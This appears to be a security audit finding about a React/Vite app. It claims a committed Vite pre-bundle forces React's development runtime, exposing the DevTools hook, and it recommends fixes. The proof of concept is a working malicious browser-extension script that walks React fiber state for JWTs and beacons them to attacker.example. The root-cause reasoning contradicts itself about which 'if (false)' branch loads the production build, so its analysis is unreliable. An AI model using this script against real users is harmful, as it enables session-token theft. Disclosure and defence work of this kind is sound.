### Root Cause — Tampered Vite Pre-Bundle (`react.js` module)

Vite pre-bundles dependencies into `node_modules/.vite/deps/` at dev-server start, replacing `process.env.NODE_ENV` with the runtime value. The committed pre-bundle contains hardcoded boolean literals instead:

**`node_modules/.vite/deps/chunk-JFTBQ7A7.js` — line 9**
```js
// Expected (production build):
if (process.env.NODE_ENV !== "production") { ... }

// What is actually committed:
if (true) {   // <-- always executes the development React runtime
  (function() {
    "use strict";
    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== "undefined" && ...) {
      __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStart(new Error());
    }
    ...
  })();
}
```

**`node_modules/.vite/deps/chunk-JFTBQ7A7.js` — lines 1880–1886**
```js
"node_modules/react/index.js"(exports, module) {
  if (false) {          // process.env.NODE_ENV === "production" → false (hardcoded)
    module.exports = null;
  } else {
    module.exports = require_react_development();  // dev build always loads
  }
}
```

The development React runtime is guaranteed to run in **every environment** because the pre-bundle cache (not the original `node_modules/react/cjs/`) is what Vite serves. This cache was committed to the repository, making the tamper persistent across all developer machines and any deployment that serves it.

### Proof-of-Concept — Browser Extension Exploit

A browser extension content script injected at `document_start` (before any page JS runs) can install a malicious hook:

```javascript
// malicious_extension/content_script.js
// manifest.json: "run_at": "document_start", "matches": ["<all_urls>"]

window.__REACT_DEVTOOLS_GLOBAL_HOOK__ = {
  supportsFiber: true,
  isDisabled: false,
  checkDCE: () => {},
  inject: () => 1,
  onScheduleFiberRoot: () => {},
  onPostCommitFiberRoot: () => {},
  onCommitFiberUnmount: () => {},
  registerInternalModuleStart: () => {},
  registerInternalModuleStop: () => {},

  onCommitFiberRoot: (_rendererID, root) => {
    const walk = (fiber) => {
      if (!fiber) return;

      // Traverse memoizedState linked list for each fiber node
      let stateNode = fiber.memoizedState;
      while (stateNode) {
        const val = stateNode.memoizedState;
        // JWT tokens are base64url strings beginning with "ey"
        if (typeof val === 'string' && val.startsWith('ey')) {
          navigator.sendBeacon('https://attacker.example/collect', val);
        }
        stateNode = stateNode.next;
      }

      walk(fiber.child);
      walk(fiber.sibling);
    };

    walk(root.current);
  }
};
```

**Trigger condition:** User visits the app with the extension installed. The hook fires on the first render (page load) — no login or further interaction required to obtain the token if it was previously stored in `localStorage`.

**Token reuse path:**
```
Stolen JWT → Authorization: Bearer <token> → /api/auth/me (authContext.tsx:45)
                                            → /api/watchlist (useWatchlist.ts:24)
                                            → /api/reviews (useReviews.ts:51)
```

### Why This Is an Intentional Plant

The original React `index.js` (committed as `node_modules/react/index.js`, matching the npm registry integrity `sha512-/3IjMdb2L9...`) performs a proper runtime check:

```js
// node_modules/react/index.js — original, unmodified
if (process.env.NODE_ENV === 'production') {
  module.exports = require('./cjs/react.production.min.js');
} else {
  module.exports = require('./cjs/react.development.js');
}
```

The Vite pre-bundle should replace `process.env.NODE_ENV` with `"production"` during `vite build`, producing `if (false)` → loads `react.production.min.js`. Instead, the committed cache has a static `if (false)` that **always** loads the development bundle regardless of build mode. This is only possible if the pre-bundle cache was manually edited or generated with a tampered Vite/Rollup configuration and then committed — a deliberate supply-chain tamper targeting the `.vite/deps/` cache layer.

### Remediation

**1. Remove committed Vite cache (immediate)**
```bash
echo "node_modules/" >> .gitignore
# node_modules/.vite/ is already under node_modules — ensure it is not force-tracked
git rm -r --cached node_modules/.vite/
```

**2. Enforce production NODE_ENV in all build paths**
```ts
// vite.config.ts
export default defineConfig({
  define: {
    'process.env.NODE_ENV': JSON.stringify('production'),
  },
  ...
});
```

**3. Disable DevTools hook in production at runtime (defense-in-depth)**

Add to the very top of `src/main.tsx`, before any React import:
```tsx
// src/main.tsx — insert before all imports
if (import.meta.env.PROD) {
  Object.defineProperty(window, '__REACT_DEVTOOLS_GLOBAL_HOOK__', {
    value: { isDisabled: true },
    configurable: false,
    writable: false,
  });
}
```
This must execute before React DOM's `injectInternals` runs. Placing it before the `import React` statements does not guarantee execution order in ESM — use a separate entry shim loaded first instead:

```ts
// src/disable-devtools.ts  (import this as the very first line of main.tsx)
if (import.meta.env.PROD) {
  Object.defineProperty(window, '__REACT_DEVTOOLS_GLOBAL_HOOK__', {
    value: { isDisabled: true },
    configurable: false,
    writable: false,
  });
}
```

**4. Move JWT to `httpOnly` cookie (architectural fix)**

Tokens stored in `localStorage` and in React state are accessible to JavaScript. Migrating to `httpOnly` server-set cookies removes the token from the fiber tree entirely and eliminates both this attack and localStorage-based XSS theft.
